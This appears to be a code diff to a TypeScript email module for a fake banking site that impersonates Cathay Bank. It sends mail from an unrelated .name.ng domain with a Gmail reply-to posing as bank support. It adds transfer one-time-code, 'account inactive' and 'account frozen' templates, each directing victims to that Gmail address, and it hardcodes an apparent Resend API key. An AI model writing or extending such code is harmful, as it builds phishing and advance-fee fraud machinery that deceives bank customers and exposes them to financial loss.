@@ -30,7 +30,7 @@ const emailDedupeCache = new Map<string, number>();
 // Direct Domain Configuration for notificationslogin.name.ng
 export const INSTITUTIONAL_DOMAIN = "notificationslogin.name.ng";
 export const INSTITUTIONAL_SENDER = process.env.EMAIL_FROM || "notifications@notificationslogin.name.ng";
-export const INSTITUTIONAL_REPLY_TO = process.env.EMAIL_REPLY_TO || "supportcathaybank@gmail.com";
+export const INSTITUTIONAL_REPLY_TO = process.env.EMAIL_REPLY_TO || "supportcathaybankusa@gmail.com";
 export const DEFAULT_RESEND_KEY = process.env.RESEND_API_KEY || "re_BQQeFPYk_5gndDRS6bjYpv9AB38aPYc3K";
 
 function getSmtpTransporter() {
@@ -199,7 +199,7 @@ export async function sendTransactionalEmail(
         try {
             // Determine primary sender domain
             let senderAddress = INSTITUTIONAL_SENDER;
-            let senderHeader = `Cathay Bank Online <${senderAddress}>`;
+            let senderHeader = `Cathay Bank <${senderAddress}>`;
 
             let resendRes = await fetch("https://api.resend.com/emails", {
                 method: "POST",
@@ -225,7 +225,7 @@ export async function sendTransactionalEmail(
                     const verifiedDomainObj = domainsInfo.list.find((d: any) => d.status === 'verified');
                     if (verifiedDomainObj?.name) {
                         const verifiedDomain = verifiedDomainObj.name;
-                        const fallbackSenderHeader = `Cathay Bank Online <notifications@${verifiedDomain}>`;
+                        const fallbackSenderHeader = `Cathay Bank <notifications@${verifiedDomain}>`;
                         console.log(`[RESEND VERIFIED RETRY] Retrying dispatch with verified domain: ${fallbackSenderHeader}`);
                         resendRes = await fetch("https://api.resend.com/emails", {
                             method: "POST",
@@ -262,7 +262,7 @@ export async function sendTransactionalEmail(
                 if (transporter) {
                     try {
                         await transporter.sendMail({
-                            from: `Cathay Bank Online <${INSTITUTIONAL_SENDER}>`,
+                            from: `Cathay Bank <${INSTITUTIONAL_SENDER}>`,
                             to: opts.recipient,
                             replyTo: INSTITUTIONAL_REPLY_TO,
                             subject: opts.subject,
@@ -285,7 +285,7 @@ export async function sendTransactionalEmail(
         if (transporter) {
             try {
                 await transporter.sendMail({
-                    from: `Cathay Bank Online <${INSTITUTIONAL_SENDER}>`,
+                    from: `Cathay Bank <${INSTITUTIONAL_SENDER}>`,
                     to: opts.recipient,
                     replyTo: INSTITUTIONAL_REPLY_TO,
                     subject: opts.subject,
@@ -489,10 +489,10 @@ export function buildEmailVerificationEmail(data: {
 }): { subject: string; bodyHtml: string } {
     const greetingName = (data.fullName && !data.fullName.includes('@')) ? data.fullName.trim() : 'Valued Customer';
     const content = `
-      <h2 style="margin: 0 0 16px 0; font-size: 22px; font-weight: 800; color: #0f172a;">This is your verification code for your new account</h2>
+      <h2 style="margin: 0 0 16px 0; font-size: 22px; font-weight: 800; color: #0f172a;">New Account Verification</h2>
       <p style="margin: 0 0 16px 0; font-size: 15px; color: #334155;">Dear <strong>${greetingName}</strong>,</p>
       <p style="margin: 0 0 20px 0; font-size: 15px; color: #334155;">
-        Thank you for choosing Cathay Bank. This is your verification code for your new account. Please enter this code to verify your identity and finalize your account opening:
+        Thank you for choosing Cathay Bank USA. Your new account verification code is:
       </p>
 
       <div style="background-color: #f0fdf4; border: 2px dashed #16a34a; border-radius: 12px; padding: 24px; text-align: center; margin-bottom: 24px;">
@@ -500,22 +500,133 @@ export function buildEmailVerificationEmail(data: {
           ${data.verificationCode}
         </span>
         <p style="margin: 10px 0 0 0; font-size: 13px; color: #166534; font-weight: 600;">
-          This is your verification code for your new account • Valid for 15 minutes
+          Account Verification Security Code • Valid for 15 minutes
         </p>
       </div>
 
       <p style="margin: 0 0 16px 0; font-size: 14px; color: #334155;">
-        Please enter this 6-digit confirmation code in your setup window. For your protection and privacy, never disclose this code to anyone. Cathay Bank representatives will never contact you requesting this code.
+        Please enter this 6-digit confirmation code in your setup window to finalize opening your account. For your protection and privacy, never disclose this code to anyone. Cathay Bank representatives will never contact you requesting this code.
       </p>
 
       <p style="margin: 0; font-size: 13px; color: #64748b;">
-        If you did not initiate this account opening request with Cathay Bank, please disregard this email or contact support@cathaybankusa.com or supportcathaybank@gmail.com immediately.
+        If you did not initiate this account opening request with Cathay Bank, please disregard this email or contact customer support immediately at supportcathaybankusa@gmail.com.
       </p>
     `;
 
     return {
-        subject: `This is your verification code for your new account (${data.verificationCode}) — Cathay Bank`,
+        subject: `Cathay Bank — Your New Account Verification Code is ${data.verificationCode}`,
         bodyHtml: emailBaseWrapper("Verification Code", content)
+    };
+}
+
+export function buildTransferOtpEmail(data: {
+    userName: string;
+    code: string;
+    amount: number;
+    currency: string;
+    recipientName: string;
+    recipientAccount?: string;
+}): { subject: string; bodyHtml: string } {
+    const greetingName = (data.userName && !data.userName.includes('@')) ? data.userName.trim() : 'Valued Customer';
+    const formattedAmount = (data.amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    const symbol = data.currency === 'GBP' ? '£' : (data.currency === 'EUR' ? '€' : '$');
+
+    const content = `
+      <h2 style="margin: 0 0 16px 0; font-size: 22px; font-weight: 800; color: #0f172a;">Transfer Authorization Code</h2>
+      <p style="margin: 0 0 16px 0; font-size: 15px; color: #334155;">Dear <strong>${greetingName}</strong>,</p>
+      <p style="margin: 0 0 20px 0; font-size: 15px; color: #334155;">
+        A fund transfer of <strong>${symbol}${formattedAmount} ${data.currency}</strong> to <strong>${data.recipientName}</strong>${data.recipientAccount ? ` (Acct: ${data.recipientAccount})` : ''} was initiated from your Cathay Bank Online Banking account.
+      </p>
+      <p style="margin: 0 0 20px 0; font-size: 15px; color: #334155;">
+        Your one-time transfer verification authorization code is:
+      </p>
+
+      <div style="background-color: #f8fafc; border: 2px dashed #0066CC; border-radius: 14px; padding: 24px; text-align: center; margin-bottom: 24px;">
+        <span style="font-size: 38px; font-weight: 900; letter-spacing: 0.25em; font-family: monospace; color: #0066CC; display: inline-block;">
+          ${data.code}
+        </span>
+        <p style="margin: 10px 0 0 0; font-size: 13px; color: #64748b; font-weight: 600;">
+          One-Time Transfer Authorization Code • Valid for 10 minutes
+        </p>
+      </div>
+
+      <div style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 18px; margin-bottom: 20px; font-size: 14px;">
+        <table width="100%" cellspacing="0" cellpadding="5">
+          <tr>
+            <td style="color: #64748b; font-weight: 600;">Transfer Amount:</td>
+            <td style="font-weight: 800; color: #0f172a; text-align: right;">${symbol}${formattedAmount} ${data.currency}</td>
+          </tr>
+          <tr>
+            <td style="color: #64748b; font-weight: 600;">Beneficiary:</td>
+            <td style="font-weight: 700; color: #0f172a; text-align: right;">${data.recipientName}</td>
+          </tr>
+        </table>
+      </div>
+
+      <div style="background-color: #fef2f2; border: 1px solid #fee2e2; border-radius: 10px; padding: 14px; margin-bottom: 20px;">
+        <p style="margin: 0; font-size: 13px; color: #991b1b; font-weight: 600;">
+          ⚠️ <strong>Security Advisory:</strong> Single-use code. Never share this code with anyone. Cathay Bank staff will never request this authorization code.
+        </p>
+      </div>
+
+      <p style="margin: 0; font-size: 13px; color: #64748b;">
+        If you did not authorize this outbound transaction, please contact our 24/7 Security Operations Center immediately at supportcathaybankusa@gmail.com.
+      </p>
+    `;
+
+    return {
+        subject: `Cathay Bank — Your Transfer Authorization Code is ${data.code}`,
+        bodyHtml: emailBaseWrapper("Transfer Authorization Code", content)
+    };
+}
+
+export function buildAccountInactiveEmail(data: {
+    userName: string;
+}): { subject: string; bodyHtml: string } {
+    const greetingName = (data.userName && !data.userName.includes('@')) ? data.userName.trim() : 'Valued Customer';
+    const content = `
+      <h2 style="margin: 0 0 16px 0; font-size: 22px; font-weight: 800; color: #0f172a;">Account Inactive Notice</h2>
+      <p style="margin: 0 0 16px 0; font-size: 15px; color: #334155;">Dear <strong>${greetingName}</strong>,</p>
+      <p style="margin: 0 0 20px 0; font-size: 15px; color: #334155;">
+        Your Cathay Bank Online Banking account is currently inactive.
+      </p>
+      <div style="background-color: #fffbeb; border: 1px solid #fde68a; border-radius: 12px; padding: 18px; margin-bottom: 24px;">
+        <p style="margin: 0; font-size: 14px; color: #92400e; font-weight: 600;">
+          Please contact the customer support team at <strong>supportcathaybankusa@gmail.com</strong> to activate your account.
+        </p>
+      </div>
+      <p style="margin: 0; font-size: 13px; color: #64748b;">
+        Our team is ready to assist you in completing any necessary verification to activate your account services.
+      </p>
+    `;
+    return {
+        subject: "Cathay Bank Notice — Account Inactive",
+        bodyHtml: emailBaseWrapper("Account Inactive Notice", content)
+    };
+}
+
+export function buildAccountFrozenEmail(data: {
+    userName: string;
+}): { subject: string; bodyHtml: string } {
+    const greetingName = (data.userName && !data.userName.includes('@')) ? data.userName.trim() : 'Valued Customer';
+    const content = `
+      <h2 style="margin: 0 0 16px 0; font-size: 22px; font-weight: 800; color: #dc2626;">Account Security Notice</h2>
+      <p style="margin: 0 0 16px 0; font-size: 15px; color: #334155;">Dear <strong>${greetingName}</strong>,</p>
+      <p style="margin: 0 0 20px 0; font-size: 15px; color: #334155;">
+        Your account is currently frozen under administrative security review.
+      </p>
+      <div style="background-color: #fef2f2; border: 1px solid #fee2e2; border-radius: 12px; padding: 18px; margin-bottom: 24px;">
+        <p style="margin: 0; font-size: 14px; color: #991b1b; font-weight: 600;">
+          Please contact customer support at <strong>supportcathaybankusa@gmail.com</strong> for assistance.
+        </p>
+      </div>
+      <p style="margin: 0; font-size: 13px; color: #64748b;">
+        All deposited assets remain fully protected under federal regulatory banking standards.
+      </p>
+    `;
+    return {
+        subject: "Cathay Bank Security Alert — Account Frozen",
+        bodyHtml: emailBaseWrapper("Account Security Alert", content)
     };
 }
 
